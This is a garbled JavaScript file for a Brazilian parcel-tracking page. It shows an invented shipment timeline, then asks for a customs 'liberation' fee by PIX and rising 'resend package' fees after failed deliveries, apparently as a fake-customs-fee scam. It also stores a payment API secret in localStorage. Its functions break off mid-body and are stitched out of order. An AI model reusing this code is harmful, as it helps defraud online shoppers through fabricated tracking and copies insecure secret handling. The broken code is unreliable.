        if (liberationButton) {
            liberationButton.style.display = 'none';
        }
        
        // Mostrar notificação de sucesso
        this.showSuccessNotification();
        
        // Iniciar fluxo pós-pagamento
        setTimeout(() => {
            // Importar e inicializar sistema pós-pagamento
            import('../components/post-payment-system.js').then(module => {
                const PostPaymentSystem = module.PostPaymentSystem;
                const postPaymentSystem = new PostPaymentSystem(this);
                postPaymentSystem.startPostPaymentFlow();
            });
        }, 1000);
    }
    
        const title = document.createElement('h4');
        title.textContent = '🧪 Controles de Teste - Avançar Etapas';
        title.style.cssText = `
            color: #2c3e50;
            margin-bottom: 20px;
            font-size: 1.1rem;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `;
        const buttonsGrid = document.createElement('div');
        buttonsGrid.style.cssText = `
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-bottom: 15px;
        `;
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
        // Criar botões para cada etapa específica
        const stepButtons = [
            { id: 'step1', text: '1. Pedido Criado', step: 1 },
            { id: 'step2', text: '2. Preparando Envio', step: 2 },
            { id: 'step3', text: '3. Enviado da China', step: 3 },
            { id: 'step4', text: '4. Centro Triagem', step: 4 },
            { id: 'step5', text: '5. Centro Logístico', step: 5 },
            { id: 'step6', text: '6. Trânsito Internacional', step: 6 },
            { id: 'step7', text: '7. Liberado Exportação', step: 7 },
            { id: 'step8', text: '8. Saiu da Origem', step: 8 },
            { id: 'step9', text: '9. Chegou no Brasil', step: 9 },
            { id: 'step10', text: '10. Centro Distribuição', step: 10 },
            { id: 'step11', text: '11. Alfândega', step: 11 }
        ];

        stepButtons.forEach(buttonInfo => {
            const button = this.createStepButton(buttonInfo);
            buttonsGrid.appendChild(button);
        });

        // Botões especiais
        const specialButtonsGrid = document.createElement('div');
        specialButtonsGrid.style.cssText = `
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 10px;
            margin-top: 15px;
            border-top: 1px solid #dee2e6;
            padding-top: 15px;
        
        // Adicionar estilos de animação se não existirem
            const style = document.createElement('style');
            style.id = 'notificationAnimations';
            style.textContent = `
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        }
        
        // Remover após 5 segundos
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    displayStaticPixModal() {
        // Exibir modal com dados estáticos como fallback
        const liberationModal = document.getElementById('liberationModal');
        if (liberationModal) {
            liberationModal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
        
        console.log('⚠️ Modal PIX estático exibido como fallback');
    }

    guideToCopyButton() {
        const copyButton = document.getElementById('copyPixButtonModal');
        const pixSection = document.querySelector('.pix-copy-section');
        
        if (copyButton && pixSection) {
            // Adicionar destaque visual temporário
            pixSection.style.position = 'relative';
            
            // Criar indicador visual
            const indicator = document.createElement('div');
            indicator.className = 'copy-guide-indicator';
            indicator.innerHTML = '👆 Copie o código PIX aqui';
            indicator.style.cssText = `
                position: absolute;
                top: -35px;
                right: 0;
                background: #ff6b35;
                color: white;
                padding: 8px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 600;
                animation: bounceIn 0.6s ease, fadeOutGuide 4s ease 2s forwards;
                z-index: 10;
                white-space: nowrap;
                box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
            `;
            
            pixSection.appendChild(indicator);
            
            // Destacar a seção PIX temporariamente
            pixSection.style.animation = 'highlightSection 3s ease';
            
            // Scroll suave para a seção do PIX
            setTimeout(() => {
                pixSection.scrollIntoView({ 
                    behavior: 'smooth', 
                    block: 'center' 
                });
            }, 200);
            
            // Remover indicador após animação
            setTimeout(() => {
                if (indicator.parentNode) {
                    indicator.remove();
                }
                pixSection.style.animation = '';
            }, 6000);
        }
    }

    closeModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    toggleAccordion() {
        const content = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon');
        
        if (!content || !toggleIcon) return;
        
        if (content.classList.contains('expanded')) {
            content.classList.remove('expanded');
            toggleIcon.classList.remove('rotated');
        } else {
            content.classList.add('expanded');
            toggleIcon.classList.add('rotated');
        }
    }

    copyPixCode(inputId, buttonId) {
        const pixCode = document.getElementById(inputId);
        const button = document.getElementById(buttonId);
        
        if (!pixCode || !button) return;
        
        try {
            // Selecionar e copiar o texto
            pixCode.select();
            pixCode.setSelectionRange(0, 99999); // Para mobile
            
            // Tentar usar a API moderna primeiro
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixCode.value).then(() => {
                    console.log('✅ PIX copiado via Clipboard API:', pixCode.value.substring(0, 50) + '...');
                    this.showCopySuccess(button);
                }).catch(() => {
                    // Fallback para execCommand
                    this.fallbackCopy(pixCode, button);
                });
            } else {
                // Fallback para execCommand
                this.fallbackCopy(pixCode, button);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
            UIHelpers.showError('Erro ao copiar código PIX. Tente selecionar e copiar manualmente.');
        }
    }

    fallbackCopy(pixCode, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                console.log('✅ PIX copiado via execCommand:', pixCode.value.substring(0, 50) + '...');
                this.showCopySuccess(button);
            } else {
                throw new Error('execCommand falhou');
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
            UIHelpers.showError('Erro ao copiar. Selecione o texto e use Ctrl+C.');
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        const specialButtons = [
            { id: 'liberation', text: '💰 Simular Liberação', action: 'liberation', color: '#ff6b35' },
            { id: 'delivery1', text: '🚚 1ª Tentativa Entrega', action: 'delivery1', color: '#e74c3c' },
            { id: 'delivery2', text: '🚚 2ª Tentativa Entrega', action: 'delivery2', color: '#e74c3c' },
            { id: 'delivery3', text: '🚚 3ª Tentativa Entrega', action: 'delivery3', color: '#e74c3c' }
        ];

        specialButtons.forEach(buttonInfo => {
            const button = this.createSpecialButton(buttonInfo);
            specialButtonsGrid.appendChild(button);
        });

        controlsContainer.appendChild(title);
        controlsContainer.appendChild(buttonsGrid);
        controlsContainer.appendChild(specialButtonsGrid);
        timeline.appendChild(controlsContainer);
    }

    createStepButton(buttonInfo) {
        const button = document.createElement('button');
        button.id = `stepButton${buttonInfo.step}`;
        button.style.cssText = `
            background: linear-gradient(45deg, #6c757d, #495057);
            color: white;
            border: none;
            padding: 8px 12px;
            font-size: 0.85rem;
            font-weight: 600;
            border-radius: 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 2px 8px rgba(108, 117, 125, 0.3);
            font-family: 'Inter', sans-serif;
        `;

        button.textContent = buttonInfo.text;
        button.addEventListener('click', () => this.advanceToStep(buttonInfo.step));

        // Verificar se a etapa já está completa
        if (this.trackingData && this.trackingData.steps[buttonInfo.step - 1]?.completed) {
            button.style.background = 'linear-gradient(45deg, #27ae60, #2ecc71)';
            button.style.opacity = '0.7';
            button.disabled = true;
        }

        return button;
    }

    createSpecialButton(buttonInfo) {
        const button = document.createElement('button');
        button.id = `specialButton${buttonInfo.id}`;
        button.style.cssText = `
            background: linear-gradient(45deg, ${buttonInfo.color}, ${this.darkenColor(buttonInfo.color)});
            color: white;
            border: none;
            padding: 10px 15px;
            font-size: 0.9rem;
            font-weight: 700;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px ${buttonInfo.color}66;
            font-family: 'Roboto', sans-serif;
            letter-spacing: 0.5px;
        `;

        button.textContent = buttonInfo.text;
        button.addEventListener('click', () => this.handleSpecialAction(buttonInfo.action));

        return button;
    }

    darkenColor(color) {
        // Função simples para escurecer uma cor hex
        const colorMap = {
            '#ff6b35': '#e55a2b',
            '#e74c3c': '#c0392b'
        };
        return colorMap[color] || color;
    }

    advanceToStep(targetStep) {
        if (!this.trackingData || !this.trackingData.steps) return;

        console.log(`🚀 Avançando para etapa ${targetStep}`);

        // Marcar todas as etapas até a target como completadas
        for (let i = 0; i < targetStep && i < this.trackingData.steps.length; i++) {
            if (!this.trackingData.steps[i].completed) {
                this.trackingData.steps[i].completed = true;
                this.trackingData.steps[i].date = new Date();
                console.log(`✅ Etapa ${i + 1} marcada como completa`);
            }
        }

        // Re-renderizar timeline
        this.renderTimeline();
        this.addStepControlButtons(); // Atualizar botões

        // Scroll para a última etapa completada
        setTimeout(() => {
            const completedItems = document.querySelectorAll('.timeline-item.completed');
            if (completedItems.length > 0) {
                const lastCompleted = completedItems[completedItems.length - 1];
                lastCompleted.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
        }, 100);

        // Se chegou na alfândega, destacar botão de liberação
        if (targetStep >= 11) {
            setTimeout(() => {
                this.highlightLiberationButton();
            }, 1000);
        }

    handleAutoFocus() {
    handleSpecialAction(action) {
        console.log(`🎯 Ação especial: ${action}`);
        
            
            // Limpar URL
            const newUrl = window.location.pathname;
            window.history.replaceState({}, document.title, newUrl);
        }
    }

    clearOldData() {
        try {
            const keys = Object.keys(localStorage);
            keys.forEach(key => {
                if (key.startsWith('tracking_')) {
                    localStorage.removeItem(key);
                }
            });
            
            // Limpar interval se existir
            if (this.timelineUpdateInterval) {
                clearInterval(this.timelineUpdateInterval);
                this.timelineUpdateInterval = null;
            }
        } catch (error) {
            console.error('Erro ao limpar dados antigos:', error);
        }
    }

    // Limpar recursos ao sair da página
    cleanup() {
        if (this.timelineUpdateInterval) {
            clearInterval(this.timelineUpdateInterval);
            this.timelineUpdateInterval = null;
        }
        
        console.log('🧹 Recursos do sistema de rastreamento limpos');
    }

    // Helper methods
    getFirstAndLastName(fullName) {
        const names = fullName.trim().split(' ');
        if (names.length === 1) {
            return names[0];
        }
        return `${names[0]} ${names[names.length - 1]}`;
    }

    updateElement(id, text) {
        switch (action) {
            case 'liberation':
                this.simulateCustomsLiberation();
                break;
            case 'delivery1':
                this.simulateDeliveryAttempt(1);
                break;
            case 'delivery2':
                this.simulateDeliveryAttempt(2);
                break;
            case 'delivery3':
                this.simulateDeliveryAttempt(3);
                break;
        }
    }

    simulateCustomsLiberation() {
        console.log('💰 Simulando liberação alfandegária...');
        
        // Garantir que está na etapa da alfândega
        this.advanceToStep(11);
        
        setTimeout(() => {
            // Simular pagamento da taxa
            this.processLiberationPayment();
        }, 1000);
    }

    simulateDeliveryAttempt(attemptNumber) {
        console.log(`🚚 Simulando ${attemptNumber}ª tentativa de entrega...`);
        
        // Garantir que passou pela liberação
        if (!this.postPaymentSystem) {
            this.simulateCustomsLiberation();
            setTimeout(() => {
                this.addDeliveryAttemptStep(attemptNumber);
            }, 3000);
        } else {
            this.addDeliveryAttemptStep(attemptNumber);
        }
    }

    addDeliveryAttemptStep(attemptNumber) {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        const stepDate = new Date();
        const values = [7.74, 12.38, 16.46];
        const value = values[attemptNumber - 1];

        const timelineItem = document.createElement('div');
        timelineItem.className = 'timeline-item completed';
        timelineItem.style.opacity = '0';
        timelineItem.style.transform = 'translateY(20px)';
        timelineItem.style.transition = 'all 0.5s ease';

        const dateStr = stepDate.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = stepDate.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        timelineItem.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${attemptNumber}ª tentativa de entrega realizada, mas não foi possível entregar</p>
                    <button class="liberation-button-timeline delivery-retry-btn" data-attempt="${attemptNumber - 1}">
                        <i class="fas fa-redo"></i> Reenviar Pacote - R$ ${value.toFixed(2)}
                    </button>
                </div>
            </div>
        `;

        timeline.appendChild(timelineItem);

        // Animar entrada
        setTimeout(() => {
            timelineItem.style.opacity = '1';
            timelineItem.style.transform = 'translateY(0)';
        }, 100);

        // Configurar botão de reenvio
            console.warn('⚠️ PostPaymentSystem não inicializado');
        }

        // Scroll para a nova etapa
        timelineItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return success;
    }
}

// Limpar recursos quando a página for fechada
window.addEventListener('beforeunload', () => {
    if (window.trackingSystemInstance) {
        window.trackingSystemInstance.cleanup();
    }
});

// Expor método global para configurar a API secret
window.setZentraPayApiSecret = function(apiSecret) {
    if (window.trackingSystemInstance) {
        return window.trackingSystemInstance.setZentraPayApiSecret(apiSecret);
    } else {
        window.ZENTRA_PAY_SECRET_KEY = apiSecret;
        localStorage.setItem('zentra_pay_secret_key', apiSecret);
        console.log('🔑 API Secret armazenada para uso posterior');
        return true;
    }
};

// Expor variável global para valor em reais
window.valor_em_reais = 26.34; // R$ 26,34 - você pode alterar este valor